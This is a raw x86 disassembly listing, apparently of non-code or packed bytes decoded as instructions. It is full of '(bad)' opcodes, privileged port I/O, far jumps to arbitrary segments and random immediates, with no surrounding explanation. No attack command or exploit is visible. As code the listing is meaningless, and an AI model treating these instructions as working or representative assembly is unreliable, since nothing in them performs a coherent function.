  419d2e:	cmp    esp,DWORD PTR [esi-0xc]
  419d31:	xor    dl,ah
  419d33:	or     DWORD PTR [esi],ebp
  419d35:	pop    esi
  419d36:	loope  0x419d81
  419d38:	hlt    
  419d39:	sub    bl,BYTE PTR [esi+0x704baa86]
  419d3f:	ds aad 0xcc
  419d42:	mov    esp,0xc14be169
  419d47:	mov    ebp,0x9b788ab2
  419d4c:	push   eax
  419d4d:	scas   al,BYTE PTR es:[edi]
  419d4e:	sahf   
  419d4f:	(bad)  
  419d50:	and    BYTE PTR [edi-0x62a8066e],ah
  419d56:	fild   QWORD PTR [eax-0x5e]
  419d59:	push   esi
  419d5a:	adc    eax,DWORD PTR [edx]
  419d5c:	push   0xc4c08989
  419d61:	retf   0x284c
  419d64:	pop    es
  419d65:	sar    BYTE PTR [edx+edi*8+0x5a],1
  419d69:	(bad)  
  419d6a:	sub    ah,bh
  419d6c:	test   BYTE PTR ds:0x0,bh
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	ss fcmove st,st(1)
  419de3:	aaa    
  419de4:	push   eax
  419de5:	mov    BYTE PTR [edi+0x16],ah
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	inc    edi
  419def:	and    DWORD PTR es:[ebx],edx
  419df2:	push   ebp
  419df3:	in     al,0xfe
  419df5:	out    0xac,al
  419df7:	jae    0x419e14
  419df9:	cdq    
  419dfa:	pop    ebp
  419dfb:	in     eax,dx
  419dfc:	sbb    BYTE PTR [eax+0x2840689c],bh
  419e02:	or     ah,ch
  419e04:	pop    ds
  419e05:	sub    BYTE PTR [eax+0x6c],bh
  419e08:	lds    ecx,FWORD PTR [ebp+0x4a1d0f17]
  419e0e:	cmp    DWORD PTR [ecx-0x39555f5e],0x7b40ae4f
  419e18:	push   ds
  419e19:	mov    bl,0x59
  419e1b:	push   ds
  419e1c:	jmp    0x5649:0xfa0e9527
  419e23:	sar    BYTE PTR [esp+edi*2+0x3d],cl
  419e27:	ret    
  419e28:	add    BYTE PTR [ebx-0x4cf0b23c],ch
  419e2e:	(bad)  
  419e30:	out    dx,al
  419e31:	and    bh,ch
  419e33:	ins    DWORD PTR es:[edi],dx
  419e34:	xchg   ebp,eax
  419e35:	mov    dl,0x1d
  419e37:	je     0x419e40
  419e39:	or     eax,0x50ee41c8
  419e3e:	mov    ebx,0xdc7d9e5b
  419e43:	sbb    DWORD PTR [edi+eiz*2],0x63
  419e47:	icebp  
  419e48:	js     0x419e08
  419e4a:	mov    ebp,0x575fc2f
  419e4f:	ud0    esp,DWORD PTR [ebp+0x5a1f504b]
  419e56:	xor    al,BYTE PTR [edx+edi*2+0x3e]
  419e5a:	pop    ss
  419e5b:	inc    edi
  419e5c:	cmp    eax,0xd569fcfc
  419e61:	xor    eax,0xed7fee3d
  419e66:	xchg   esp,eax
  419e67:	fimul  DWORD PTR [ebx+0x6d]
  419e6a:	sub    edx,ebx
  419e6c:	ret    0xccfc
  419e6f:	add    BYTE PTR [ebx-0x16],ch
  419e72:	mov    eax,ds:0x22f76bed
  419e77:	fild   QWORD PTR ds:0xa7bd1f37
  419e7d:	icebp  
  419e7e:	lahf   
  419e7f:	jne    0x419e46
  419e81:	cmp    ah,BYTE PTR [edi-0x76904a6d]
  419e87:	jecxz  0x419e84
  419e89:	xor    BYTE PTR ds:0xbf29a8af,0xf
  419e90:	jl     0x419eeb
  419e92:	pop    edx
  419e93:	jbe    0x419ee9
  419e95:	in     al,0x65
  419e97:	int    0x18
  419e99:	xchg   ebx,eax
  419e9a:	mov    ecx,DWORD PTR [ebx+edx*2+0x17c5e9a5]
  419ea1:	test   esp,0x57c56ba9
  419ea7:	jmp    0x38e0:0x96f771de
  419eae:	mov    ecx,0x7e75a5e5
  419eb3:	mov    al,0xbb
  419eb5:	or     ecx,edi
  419eb7:	pop    ecx
  419eb8:	mov    ds:0xdfc5c2be,eax
  419ebd:	xchg   ebx,eax
  419ebe:	adc    ch,bl
  419ec0:	pop    esp
  419ec1:	out    dx,al
  419ec2:	xchg   dl,dh
  419ec4:	call   0x57860d4f
  419ec9:	shr    ebp,0x10
  419ecc:	inc    ecx
  419ecd:	scas   eax,DWORD PTR es:[edi]
  419ece:	idiv   DWORD PTR ss:[ecx]
  419ed1:	repz popf 
  419ed3:	or     DWORD PTR [edi],edi
  419ed5:	aaa    
  419ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed7:	lods   eax,DWORD PTR ds:[esi]
  419ed8:	xor    eax,0x21ef60b4
  419edd:	mov    esi,0x588b9787
  419ee2:	dec    edx
  419ee3:	cdq    
  419ee4:	add    cl,BYTE PTR [ebp+edx*8-0x165308d0]
  419eeb:	xchg   ebp,eax
  419eec:	leave  
  419eed:	inc    DWORD PTR [eax]
	...
  419f53:	add    BYTE PTR [eax],al
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f63:	add    BYTE PTR [edx],0xe9
  419f66:	addr16 pop ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	sbb    bl,dl
  419f70:	scas   al,BYTE PTR es:[edi]
  419f71:	mov    ch,0x4f
  419f73:	lahf   
  419f74:	mov    al,0x1e
  419f76:	mov    dl,0x6d
  419f78:	push   ebx
  419f79:	xchg   ebp,eax
  419f7a:	mov    ds:0xa2b7a802,al
  419f7f:	push   ebx
  419f80:	jae    0x419f06
  419f82:	push   0x56
  419f84:	je     0x419f89
  419f86:	push   eax
  419f87:	mov    ebp,esi
  419f89:	fs int 0x6d
  419f8c:	pop    esi
  419f8d:	js     0x419fde
  419f8f:	xchg   BYTE PTR [eax-0x7],dl
  419f92:	mov    gs,ecx
  419f94:	aam    0x4d
  419f96:	in     al,dx
  419f97:	shl    ch,cl
  419f99:	jmp    0x19bd89cf
  419f9e:	inc    ecx
  419f9f:	in     eax,0xd4
  419fa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fa2:	inc    edi
  419fa3:	push   ds
  419fa4:	fld    st(7)
  419fa6:	ror    esp,cl
  419fa8:	sbb    al,0x3f
  419faa:	mov    dh,0xfd
  419fac:	cmp    al,0x6c
  419fae:	xchg   esp,eax
  419faf:	loopne 0x419f40
  419fb1:	xlat   BYTE PTR ds:[ebx]
  419fb2:	cdq    
  419fb3:	pusha  
  419fb4:	mov    esp,0x1363e730
  419fb9:	or     eax,0x42bb71a2
  419fbe:	sbb    ah,BYTE PTR [esi+edx*2-0x6a7af025]
  419fc5:	(bad)  
  419fc6:	cli    
  419fc7:	mov    dl,0x92
  419fc9:	into   
  419fca:	xchg   ecx,eax
  419fcb:	pushf  
  419fcc:	cmc    
  419fcd:	ret    0x9087
  419fd0:	sub    eax,0xbdde0a2
  419fd5:	mov    bl,0xfd
  419fd7:	inc    edx
  419fd8:	stos   BYTE PTR es:[edi],al
  419fd9:	sbb    DWORD PTR [edi+0x2f],edx
  419fdc:	lock rol DWORD PTR [ebp+0x64],cl
  419fe0:	mov    ebx,0x39fa22fe
  419fe5:	pushf  
  419fe6:	aas    
  419fe7:	loopne 0x419f9e
  419fe9:	mov    al,ds:0xcab64895
  419fee:	int    0x79
  419ff0:	int    0xaa
  419ff2:	cmp    DWORD PTR [eax],esp
  419ff4:	fs sbb eax,0x3223b160
  419ffa:	pop    ebx
  419ffb:	fst    DWORD PTR [ebp+ebp*4-0x1499ef58]
  41a002:	data16 test BYTE PTR [esi-0x47f0f96b],dh
  41a009:	imul   ecx,DWORD PTR [esp+eax*1-0x3b],0x22
  41a00e:	cmp    BYTE PTR [ebp-0x40bd37e0],0xad
  41a015:	sub    eax,0xdb926257
  41a01a:	jge    0x41a028
  41a01c:	jmp    0x70524d4a
  41a021:	fdivp  st(5),st
  41a023:	push   es
  41a024:	push   0x8618152c
  41a029:	(bad)  
  41a02b:	sahf   
  41a02c:	in     eax,dx
  41a02d:	xchg   esp,eax
  41a02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a02f:	inc    ecx
  41a030:	adc    dh,dh
  41a032:	fistp  WORD PTR [ecx+0x70]
  41a035:	add    ebp,edi
  41a037:	push   eax
  41a038:	xchg   DWORD PTR [ebp-0x3e2a9000],edi
  41a03e:	and    eax,0x618c82d6
  41a043:	lds    ebp,FWORD PTR [eax]
  41a045:	sbb    al,0xb7
  41a047:	xchg   ebx,eax
  41a048:	fdiv   st,st(1)
  41a04a:	les    edi,FWORD PTR [edi]
  41a04c:	xchg   edi,eax
  41a04d:	mov    bl,0x2c
  41a04f:	int3   
  41a050:	push   cs
  41a051:	cli    
  41a052:	sub    ch,BYTE PTR [ecx+edi*1+0x70]
  41a056:	dec    ebp
  41a057:	popa   
  41a058:	shr    BYTE PTR [ecx-0xf],cl
  41a05b:	cmp    ch,BYTE PTR [ebx+0x6b]
  41a05e:	sbb    al,0x80
  41a060:	int3   
  41a061:	gs cwde 
  41a063:	dec    eax
  41a064:	dec    ebx
  41a065:	dec    ecx
  41a066:	out    dx,al
  41a067:	outs   dx,BYTE PTR ds:[esi]
  41a068:	retf   0x2365
  41a06b:	jmp    0x42429c
	...
  41a0d4:	add    BYTE PTR [eax],al
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax+0x65],bh
  41a0e3:	out    0xd5,eax
  41a0e5:	xor    BYTE PTR [edi+0x18],ah
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	sbb    al,0x83
  41a0f0:	dec    esi
  41a0f1:	rcl    ah,0x2c
  41a0f4:	je     0x41a0cc
  41a0f6:	mov    ch,0xf5
  41a0f8:	test   DWORD PTR [edx],edx
  41a0fa:	push   es
  41a0fb:	hlt    
  41a0fc:	push   0x2dd5c72c
  41a101:	std    
  41a102:	ret    0xae99
  41a105:	fild   QWORD PTR [edx+0x5f]
  41a108:	(bad)  
  41a109:	in     eax,0xa0
  41a10b:	sar    BYTE PTR [ecx+0x2d4c713d],0xd7
  41a112:	inc    esp
  41a113:	pushf  
  41a114:	sti    
  41a115:	out    dx,al
  41a116:	retf   0x92d1
  41a119:	xor    al,0x69
  41a11b:	push   eax
  41a11c:	xchg   BYTE PTR [ecx],dh
  41a11e:	int3   
  41a11f:	mov    al,ds:0x99a64865
  41a124:	xor    BYTE PTR [ebx+0x2faa6c2e],0xb7
  41a12b:	and    ebx,DWORD PTR [ebx]
  41a12d:	mov    WORD PTR [esi-0x2cdbc5e7],ss
  41a133:	ja     0x41a0d2
  41a135:	fiadd  DWORD PTR [edi-0x1e]
  41a138:	sbb    bl,BYTE PTR [esi]
  41a13a:	jle    0x41a0f4
  41a13c:	aad    0x1d
  41a13e:	add    BYTE PTR ds:0xa45b0b16,cl
  41a144:	sti    
  41a145:	test   eax,0xc18c795c
  41a14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a14c:	rol    ebx,cl
  41a14e:	(bad)  
  41a150:	repnz gs into 
  41a153:	aad    0x5d
  41a155:	jp     0x41a1a0
  41a157:	nop
  41a158:	enter  0x9d2d,0x75
  41a15c:	ret    
  41a15d:	stos   BYTE PTR es:[edi],al
  41a15e:	shr    bh,1
  41a160:	call   0x95ff:0x3073a6fe
  41a167:	sbb    ch,bl
  41a169:	sbb    al,0x72
  41a16b:	mov    cl,0x50
  41a16d:	cs pop eax
  41a16f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a170:	ret    
  41a171:	sbb    BYTE PTR [ecx+0x73326840],0x2f
  41a178:	sbb    ch,BYTE PTR [eax+0x3ba28628]
  41a17e:	xor    ebx,esi
  41a180:	inc    esi
  41a181:	loope  0x41a1b4
  41a183:	pop    esi
  41a184:	jb     0x41a17e
  41a186:	neg    BYTE PTR [edx]
  41a188:	inc    ebp
  41a189:	mov    esp,0xb5924e9c
  41a18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a18f:	inc    ebp
  41a190:	es xchg ebx,eax
  41a192:	sbb    cl,BYTE PTR [eax-0x13]
  41a195:	sub    eax,0x21d6884a
  41a19a:	int    0x62
  41a19c:	fmul   QWORD PTR [edx-0x61]
  41a19f:	or     BYTE PTR [ebx],ah
  41a1a1:	cmp    ah,BYTE PTR [edx+0x40]
  41a1a4:	ret    
  41a1a5:	mov    esi,DWORD PTR [eax-0x63255dc6]
  41a1ab:	lods   al,BYTE PTR ds:[esi]
  41a1ac:	push   edx
  41a1ad:	out    dx,al
  41a1ae:	dec    esi
  41a1af:	out    dx,eax
  41a1b0:	push   edx
  41a1b1:	das    
  41a1b2:	dec    edi
  41a1b3:	cmp    cl,BYTE PTR [ebp+0x1ae97f10]
  41a1b9:	jecxz  0x41a227
  41a1bb:	adc    dh,BYTE PTR [ecx-0x29]
  41a1be:	and    eax,0xe86f5185
  41a1c3:	shr    BYTE PTR [ebx+0xa],0x19
  41a1c7:	jge    0x41a1bf
  41a1c9:	stos   DWORD PTR es:[edi],eax
  41a1ca:	adc    esp,0xffffff97
  41a1cd:	sub    bl,BYTE PTR [edi]
  41a1cf:	and    edx,ebx
  41a1d1:	pop    ds
  41a1d2:	cmp    bh,BYTE PTR [esi-0x360a26f1]
  41a1d8:	xchg   esp,eax
  41a1d9:	(bad)  
  41a1db:	rcl    DWORD PTR [esp+edi*2],0x51
  41a1df:	rol    BYTE PTR [edi],0x7c
  41a1e2:	sub    al,0x2
  41a1e5:	cwde   
  41a1e6:	xchg   ebx,eax
  41a1e7:	enter  0x4f71,0xfd
  41a1eb:	in     eax,dx
  41a1ec:	aaa    
  41a1ed:	mov    ds:0x0,al
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	addr16 dec esp
  41a264:	add    edi,DWORD PTR [edx+0x67]
  41a267:	sbb    DWORD PTR [ecx],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [edx+0x7219e536],dh
  41a273:	cmp    eax,0x57425609
  41a278:	inc    ebp
  41a279:	cld    
  41a27a:	dec    ebp
  41a27b:	mov    ebx,0xe388b6be
  41a280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a282:	in     al,0x5f
  41a284:	lods   al,BYTE PTR ds:[esi]
  41a285:	adc    eax,0x26392de1
  41a28a:	mov    bl,0x8d
  41a28c:	sbb    eax,0x185bb381
  41a291:	xor    esp,DWORD PTR [ebx-0x4]
  41a294:	cmp    cl,BYTE PTR [ebp+0xf1ce42b]
  41a29a:	enter  0xaf53,0x91
  41a29e:	es cmc 
  41a2a0:	mov    bl,0xa4
  41a2a2:	xor    DWORD PTR [ecx-0x22069ce6],ebp
  41a2a8:	out    dx,al
  41a2a9:	loop   0x41a280
  41a2ab:	cmp    al,ah
  41a2ad:	call   0xde1b7538
  41a2b2:	add    DWORD PTR [esi-0x6a0da00a],edx
  41a2b8:	fst    st(4)
  41a2ba:	(bad)  
  41a2bb:	adc    eax,0xabb288f5
  41a2c0:	test   BYTE PTR ds:0x245c5bd0,bh
  41a2c6:	push   edi
  41a2c7:	(bad)  
  41a2c8:	stc    
  41a2c9:	test   eax,0x81f651b4
  41a2ce:	js     0x41a31d
  41a2d0:	cmp    ecx,DWORD PTR [ecx]
  41a2d2:	fwait
  41a2d3:	inc    edi
  41a2d4:	mov    ds:0x74087fe2,eax
  41a2d9:	fsubr  st(7),st
  41a2db:	ret    
  41a2dc:	lods   al,BYTE PTR ds:[esi]
  41a2dd:	push   ds
  41a2de:	adc    BYTE PTR [edx-0x24ae4b8c],cl
  41a2e4:	dec    ebp
  41a2e5:	xchg   edi,eax
  41a2e6:	loope  0x41a330
  41a2e8:	test   bh,0xef
  41a2eb:	dec    edi
  41a2ec:	cmp    esp,DWORD PTR [esi+0x20]
  41a2ef:	xor    bl,BYTE PTR [edx-0x22423773]
  41a2f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2f6:	inc    ebp
  41a2f7:	icebp  
  41a2f8:	mov    edx,0x5c2e6d41
  41a2fd:	div    BYTE PTR [edi]
  41a2ff:	neg    ah
  41a301:	mov    ecx,0x2a74a0ca
  41a306:	push   es
  41a307:	inc    ecx
  41a308:	pop    ss
  41a309:	call   edx
  41a30b:	call   0x15014cf8
  41a310:	inc    esp
  41a311:	and    esi,esi
  41a313:	dec    ebx
  41a314:	es inc esi
  41a316:	frstor [eax+0x481df94e]
  41a31c:	test   eax,0xe43d613a
  41a321:	jge    0x41a305
  41a323:	jmp    0x69a72606
  41a328:	cmp    eax,0x41e7ee01
  41a32d:	loop   0x41a2eb
  41a32f:	in     al,dx
  41a330:	mov    al,ds:0x408feb
  41a335:	xor    BYTE PTR [ecx+0x5a],0xcf
  41a339:	fidivr DWORD PTR [eax+0x500d56d0]
  41a33f:	pop    ecx
  41a340:	pop    esi
  41a341:	push   edi
  41a342:	repz xchg edx,eax
  41a344:	pop    eax
  41a345:	enter  0x69a6,0x2f
  41a349:	call   0xdad1:0x9b5ce7f8
  41a350:	mov    dl,0x3c
  41a352:	jecxz  0x41a36a
  41a354:	sbb    esi,DWORD PTR [edx]
  41a356:	xchg   ebx,eax
  41a357:	es cdq 
  41a359:	popa   
  41a35a:	test   BYTE PTR [esp+eax*4-0x16],ch
  41a35e:	jno    0x41a33c
  41a360:	cld    
  41a361:	nop
  41a362:	xchg   edi,eax
  41a363:	cmp    esi,DWORD PTR [edi]
  41a365:	(bad)  
  41a366:	sub    bl,bl
  41a368:	xchg   edx,eax
  41a369:	sub    al,ah
  41a36b:	mov    ds:0xcb68,eax
	...
  41a3d4:	add    BYTE PTR [eax],al
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	mov    ch,0x89
  41a3e4:	pop    edx
  41a3e5:	out    0x67,al
  41a3e7:	sbb    al,BYTE PTR [ecx]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    BYTE PTR [edx+eax*1-0x4a],dl
  41a3f1:	imul   edi,DWORD PTR [ecx-0x1ad07cce],0x1d95f207
  41a3fb:	cmp    ebp,0x1660206b
  41a401:	add    eax,DWORD PTR [eax+edx*8]
  41a404:	lds    eax,FWORD PTR [ebp+0x7b9efc86]
  41a40a:	gs cs stos DWORD PTR es:[edi],eax
  41a40d:	inc    esi
  41a40e:	fcmovnb st,st(4)
  41a410:	das    
  41a411:	jecxz  0x41a3de
  41a413:	addr16 jge 0x41a41c
  41a416:	je     0x41a3d1
  41a418:	loop   0x41a3c9
  41a41a:	cmp    ebx,DWORD PTR fs:[edi+eiz*1+0x75]
  41a41f:	mov    ebp,0x9233cc2e
  41a424:	or     BYTE PTR [ecx-0x25073a47],al
  41a42a:	push   cs
  41a42b:	fsubrp st(2),st
  41a42d:	adc    ah,BYTE PTR [eax]
  41a42f:	pop    ebx
  41a430:	jb     0x41a3c1
  41a432:	jp     0x41a482
  41a434:	(bad)  
  41a435:	sbb    BYTE PTR [edx-0x44f9ec3d],bh
  41a43b:	push   edx
  41a43c:	lods   eax,DWORD PTR ds:[esi]
  41a43d:	jb     0x41a49f
  41a43f:	ins    BYTE PTR es:[edi],dx
  41a440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a441:	mov    edi,edx
  41a443:	int3   
  41a444:	pop    esi
  41a445:	fbld   TBYTE PTR [edi]
  41a447:	ds iret 
  41a449:	rcl    DWORD PTR [ecx-0x56],cl
  41a44c:	add    al,0xf2
  41a44e:	mov    al,0x8c
  41a450:	ret    0x6e1
  41a453:	cdq    
  41a454:	xor    eax,0xb4e44c64
  41a459:	inc    edi
  41a45a:	retf   
  41a45b:	cmp    BYTE PTR [esi+0x8],dh
  41a45e:	push   esi
  41a45f:	ret    0x819f
  41a462:	xor    dh,al
  41a464:	push   cs
  41a465:	test   BYTE PTR [edx],bh
  41a467:	leave  
  41a468:	jge    0x41a478
  41a46a:	xor    BYTE PTR [esi],dl
  41a46c:	sbb    DWORD PTR [ebp+0x75],ebp
  41a46f:	push   ss
  41a470:	push   edi
  41a471:	lods   al,BYTE PTR ds:[esi]
  41a472:	ffree  st(3)
  41a474:	iret   
  41a475:	(bad)  
  41a476:	mov    fs,WORD PTR ds:0x79424b65
  41a47c:	sub    esp,DWORD PTR [eax]
  41a47e:	mov    ch,0xa8
  41a480:	adc    DWORD PTR [ebx],ebp
  41a482:	mov    bh,BYTE PTR [ebp+0x5c]
  41a485:	jecxz  0x41a4c6
  41a487:	xor    DWORD PTR [edx+0x36],eax
  41a48a:	stc    
  41a48b:	inc    esi
  41a48c:	and    al,0x5c
  41a48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a48f:	ret    
  41a490:	shl    DWORD PTR [esi-0x5ab8d011],1
  41a496:	push   0xb
  41a498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a499:	ja     0x41a462
  41a49b:	xchg   esi,eax
  41a49c:	gs jns 0x41a51b
  41a49f:	ss mov ecx,0xd0dcdf25
  41a4a5:	repz and BYTE PTR [bp+di-0x48],bh
  41a4aa:	pop    eax
  41a4ab:	mov    cs,WORD PTR [eax+0x2edf06a1]
  41a4b1:	inc    ebp
  41a4b2:	sahf   
  41a4b3:	cmp    bl,bl
  41a4b5:	xchg   BYTE PTR [ecx],ah
  41a4b7:	jmp    0x41a43b
  41a4b9:	xor    ch,BYTE PTR [ebp-0x6d1fefef]
  41a4bf:	add    al,0xb1
  41a4c1:	mov    ebx,0x7993279
  41a4c6:	idiv   DWORD PTR [eax]
  41a4c8:	into   
  41a4c9:	sub    al,0xd7
  41a4cb:	sbb    BYTE PTR [ebx-0x44],0xc
  41a4cf:	cmp    eax,0xeb00f526
  41a4d4:	sti    
  41a4d5:	cmp    DWORD PTR [ebp+0x27a96fa8],ecx
  41a4db:	test   DWORD PTR [edx+0x454378bb],ebx
  41a4e1:	ja     0x41a506
  41a4e3:	inc    edx
  41a4e4:	add    eax,ebx
  41a4e6:	adc    eax,0xece66684
  41a4eb:	stc    
  41a4ec:	cli    
  41a4ed:	push   ebp
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	out    0x7d,eax
  41a564:	inc    BYTE PTR [edi+eiz*2]
  41a567:	sbb    eax,DWORD PTR [ecx]
  41a569:	add    BYTE PTR [eax],al
  41a56b:	add    DWORD PTR [eax],eax
  41a56d:	add    BYTE PTR [ebx-0x65278656],al
  41a573:	shl    DWORD PTR [ebp+0x1b5a01ee],0x9a
  41a57a:	ret    
  41a57b:	jne    0x41a5ea
  41a57d:	cld    
  41a57e:	mov    eax,ds:0x34c595c7
  41a583:	mov    bh,0xe2
  41a585:	add    cl,BYTE PTR [eax-0x7ba45ae4]
  41a58b:	fcmovnb st,st(1)
  41a58d:	iret   
  41a58e:	out    0x67,eax
  41a590:	ja     0x2e525490
  41a596:	add    esi,ecx
  41a598:	xchg   ebx,eax
  41a599:	int    0xa2
  41a59b:	push   ecx
  41a59c:	inc    ebx
  41a59d:	cmp    BYTE PTR [esi],ch
  41a59f:	sbb    dh,BYTE PTR [esi+0x7d]
  41a5a2:	scas   al,BYTE PTR es:[edi]
  41a5a3:	jg     0x41a5d4
  41a5a5:	inc    ecx
  41a5a6:	cmp    DWORD PTR [ebp+edi*4+0x3],edi
  41a5aa:	dec    ebx
  41a5ab:	dec    eax
  41a5ac:	mov    edx,0xe8b922df
  41a5b1:	or     esi,DWORD PTR [ecx-0xe]
  41a5b4:	or     edi,edx
  41a5b6:	out    dx,al
  41a5b7:	or     eax,0xab2f258b
  41a5bc:	add    ecx,edx
  41a5be:	xor    ah,ah
  41a5c0:	cwde   
  41a5c1:	rcr    bh,1
  41a5c3:	imul   edi,DWORD PTR [edi],0x817ea072
  41a5c9:	sub    edi,DWORD PTR [eax]
  41a5cb:	das    
  41a5cc:	lods   eax,DWORD PTR fs:[esi]
  41a5ce:	mov    ch,BYTE PTR [esi]
  41a5d0:	fisttp WORD PTR [esi-0x19]
  41a5d3:	mov    bh,0x32
  41a5d5:	mov    dh,0xab
  41a5d7:	retf   0x83a4
  41a5da:	cli    
  41a5db:	xor    al,0x79
  41a5dd:	jno    0x41a5e3
  41a5df:	rcl    DWORD PTR cs:[edx+0x1c243a44],cl
  41a5e6:	arpl   WORD PTR [ebp+0x1eabae74],si
  41a5ec:	push   edx
  41a5ed:	lods   al,BYTE PTR ds:[esi]
  41a5ee:	pop    ds
  41a5ef:	or     edx,DWORD PTR [edi+eax*4-0x3]
  41a5f3:	jo     0x41a580
  41a5f5:	outs   dx,DWORD PTR ds:[esi]
  41a5f6:	ret    0xf206
  41a5f9:	inc    edi
  41a5fa:	sahf   
  41a5fb:	add    eax,0xa6b68887
  41a600:	add    DWORD PTR [ebx+0x33],eax
  41a603:	push   ds
  41a604:	xchg   ebx,eax
  41a605:	mov    esi,0x13957456
  41a60a:	sbb    ebp,0xffffffcb
  41a60d:	mov    ecx,0x28e47810
  41a612:	(bad)  
  41a613:	inc    ecx
  41a614:	out    0x26,eax
  41a616:	xor    BYTE PTR [edi],cl
  41a618:	(bad)  
  41a61a:	and    eax,DWORD PTR [ebx+0x3f5c8975]
  41a620:	jle    0x41a63e
  41a622:	mov    al,0x57
  41a624:	sbb    al,0x74
  41a626:	test   al,0xd7
  41a628:	outs   dx,BYTE PTR ds:[esi]
  41a629:	je     0x41a5c8
  41a62b:	ins    DWORD PTR es:[edi],dx
  41a62c:	retf   
  41a62d:	mov    eax,ds:0x2f84a987
  41a632:	jecxz  0x41a5c7
  41a634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a635:	push   0xffffffde
  41a637:	fsubrp st(0),st
  41a639:	dec    edx
  41a63a:	jne    0x41a65a
  41a63c:	dec    edi
  41a63d:	ror    esi,0xd8
  41a640:	call   0xd68c7d6
  41a645:	jb     0x41a67d
  41a647:	and    BYTE PTR [edx],dh
  41a649:	mov    edi,DWORD PTR [eax+ebx*8]
  41a64c:	test   BYTE PTR [esi+esi*8],cl
  41a64f:	jmp    0x41a6b6
  41a651:	inc    eax
  41a652:	daa    
  41a653:	jnp    0x41a63e
  41a655:	js     0x41a671
  41a657:	jmp    0x41a61e
  41a659:	dec    edi
  41a65a:	repz lahf 
  41a65c:	add    DWORD PTR [edx],esi
  41a65e:	mov    dl,0x6d
  41a660:	push   0x60
  41a662:	les    edi,FWORD PTR [ebx+0x3d3ccf18]
  41a668:	dec    ebx
  41a669:	sub    ah,dl
  41a66b:	fdiv   DWORD PTR [ecx+0xb]
	...
  41a6d6:	pop    esp
  41a6d7:	sub    al,BYTE PTR [ecx]
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x9cf6a625
  41a6e4:	sbb    ch,cl
  41a6e6:	addr16 sbb al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    dh,ch
  41a6ef:	rcr    BYTE PTR [edi],cl
  41a6f1:	pop    ebx
  41a6f2:	fild   DWORD PTR [ecx+edi*2-0x6f]
  41a6f6:	and    BYTE PTR [ebp-0x4a],al
  41a6f9:	push   ds
  41a6fa:	xlat   BYTE PTR ds:[ebx]
  41a6fb:	sub    al,bh
  41a6fd:	mov    dl,0x45
  41a6ff:	adc    cl,al
  41a701:	scas   eax,DWORD PTR es:[edi]
  41a702:	cmp    eax,0x97610fc
  41a707:	cld    
  41a708:	out    dx,al
  41a709:	pop    edx
  41a70a:	in     eax,0x56
  41a70c:	or     DWORD PTR [esi+0xce76ff],ebp
  41a712:	dec    ebp
  41a713:	mov    esi,0xf9494c45
  41a718:	cs pop ecx
  41a71a:	dec    ecx
  41a71b:	xlat   BYTE PTR ds:[ebx]
  41a71c:	xor    DWORD PTR [edx+0x42],ebx
  41a71f:	mov    ebx,0x66147af6
  41a724:	or     eax,0x2ea3198d
  41a729:	mov    DWORD PTR ds:0xe3e925e2,edx
  41a72f:	daa    
  41a730:	bound  ebx,QWORD PTR ds:0x37b65714
  41a736:	or     BYTE PTR [eax+0x390370bb],dl
  41a73c:	fist   WORD PTR [ebx]
  41a73e:	xchg   ebp,eax
  41a73f:	jl     0x41a71f
  41a741:	fbld   TBYTE PTR [ebx+0x2b]
  41a744:	stc    
  41a745:	pop    esi
  41a746:	(bad)  
  41a747:	js     0x41a714
  41a749:	jb     0x41a70e
  41a74b:	sbb    eax,0x8aed2dce
  41a750:	je     0x41a752
